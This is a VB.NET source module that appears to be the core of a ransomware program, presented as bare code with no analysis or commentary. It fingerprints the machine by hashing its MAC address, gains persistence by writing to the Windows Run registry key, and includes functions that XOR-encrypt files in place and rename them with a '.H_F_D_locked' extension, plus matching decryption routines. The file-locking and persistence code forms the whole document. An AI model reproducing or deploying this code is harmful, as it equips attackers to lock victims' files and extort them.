Imports System.Net.NetworkInformation
Imports System.Security.Cryptography
Imports System.Text
Imports System.CodeDom

Module Func
    Public LO As Object = New IO.FileInfo(Application.ExecutablePath)
    Public Function CheckForInternetConnection() As Boolean
        Try
            Using client = New System.Net.WebClient()
                Using stream = client.OpenRead("http://www.google.com")
                    Return True
                End Using
            End Using
        Catch
            Return False
        End Try
    End Function
    Public ReadOnly Property getUNIQE() As String
        Get
            Dim uniqe As String = ""
            For Each nic As NetworkInterface In NetworkInterface.GetAllNetworkInterfaces()
                uniqe = nic.GetPhysicalAddress().ToString()
                Exit For
            Next nic
            Using md5Hash As MD5 = MD5.Create()
                Dim data() As Byte = md5Hash.ComputeHash(Encoding.UTF8.GetBytes(uniqe))
                Dim sBuilder As New StringBuilder()
                For i As Integer = 0 To data.Length - 1
                    sBuilder.Append(data(i).ToString("x2"))
                Next i
                uniqe = sBuilder.ToString()
            End Using
            Return uniqe
        End Get
    End Property
    Public Sub AStartup(ByVal Name As String, ByVal Path As String)
        Dim Registry As Microsoft.Win32.RegistryKey = Microsoft.Win32.Registry.CurrentUser
        Dim Key As Microsoft.Win32.RegistryKey = Registry.OpenSubKey("Software\Microsoft\Windows\CurrentVersion\Run", True)
        Key.SetValue(Name, Path, Microsoft.Win32.RegistryValueKind.String)
    End Sub
    Public Function Installeddate() As String
        If My.Settings.Installeddate = "" Then : Try : My.Settings.Installeddate = CType(LO, IO.FileInfo).LastWriteTime.ToString("yyyy-MM-dd hh:mm:ss") : My.Settings.Save() : Catch ex As Exception : End Try : End If
        Return My.Settings.Installeddate
    End Function
    Public Function ConvertFiletoBytes(ByVal FilePath As String) As Byte()
        Dim _tempByte() As Byte = Nothing
        If String.IsNullOrEmpty(FilePath) = True Then
            Throw New ArgumentNullException("File Name Cannot be Null or Empty", "FilePath")
            Return Nothing
        End If
        Try
            Dim _fileInfo As New IO.FileInfo(FilePath)
            Dim _NumBytes As Long = _fileInfo.Length
            Dim _FStream As New IO.FileStream(FilePath, IO.FileMode.Open, IO.FileAccess.Read)
            Dim _BinaryReader As New IO.BinaryReader(_FStream)
            _tempByte = _BinaryReader.ReadBytes(Convert.ToInt32(_NumBytes))
            _fileInfo = Nothing
            _NumBytes = 0
            _FStream.Close()
            _FStream.Dispose()
            _BinaryReader.Close()
            Return _tempByte
        Catch ex As Exception
            Return Nothing
        End Try
    End Function
    Public Function ConvertBytesToFile(ByVal FilePath As String, ByVal fileData As Byte()) As Boolean
        If IsNothing(fileData) = True Then
            Return False
        End If
        Try
            Dim fs As IO.FileStream = New IO.FileStream(FilePath, IO.FileMode.OpenOrCreate, IO.FileAccess.Write)
            Dim bw As IO.BinaryWriter = New IO.BinaryWriter(fs)
            bw.Write(fileData)
            bw.Flush()
            bw.Close()
            fs.Close()
            bw = Nothing
            fs.Dispose()
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function
    Public Function doEncrypt(ByVal file As String, ByVal password As String) As Object
        Try
            Dim contents As Byte() = XOR_Enc(ConvertFiletoBytes(file), password)
            ConvertBytesToFile(file, contents)
            IO.File.Move(file, file & ".H_F_D_locked")
            Return True
        Catch ex As Exception
            MsgBox(ex.ToString, MsgBoxStyle.Critical)
        End Try
        Return Nothing
    End Function
    Public Function XOR_Dec(ByVal input As String, ByVal key As String, Optional amount As Integer = 8) As Byte()
        Dim b1 As Byte() = System.Text.Encoding.Default.GetBytes(input)
        Dim b2 As Byte() = System.Text.Encoding.Default.GetBytes(key)
        For i = 0 To b1.Length - 1
            b1(i) = b1(i) Xor (b2(i Mod b2.Length) << (i + amount + b2.Length)) And 255
        Next
        Return b1
    End Function
    Public Function doDecrypt(ByVal file As String, ByVal password As String) As Object
        Try
            Dim contents As Byte() = XOR_Dec(BS(IO.File.ReadAllBytes(file)), password)
            ConvertBytesToFile(file, contents)
            IO.File.Move(file, file.Replace(".H_F_D_locked", ""))
            Return True
        Catch ex As Exception
        End Try
        Return Nothing
    End Function
    Function XOR_Enc(ByVal input As Byte(), ByVal key As String, Optional amount As Integer = 8) As Byte()
        Dim b1 As Byte() = input
        Dim b2 As Byte() = System.Text.Encoding.Default.GetBytes(key)
        For i = 0 To b1.Length - 1
            b1(i) = b1(i) Xor (b2(i Mod b2.Length) << (i + amount + b2.Length)) And 255
        Next
        Return b1
    End Function
    Public Function BS(ByVal b As Byte()) As String
        Return System.Text.Encoding.Default.GetString(b)
    End Function
    Public Function SB(ByVal s As String) As Byte()
        Return System.Text.Encoding.Default.GetBytes(s)
    End Function
End Module
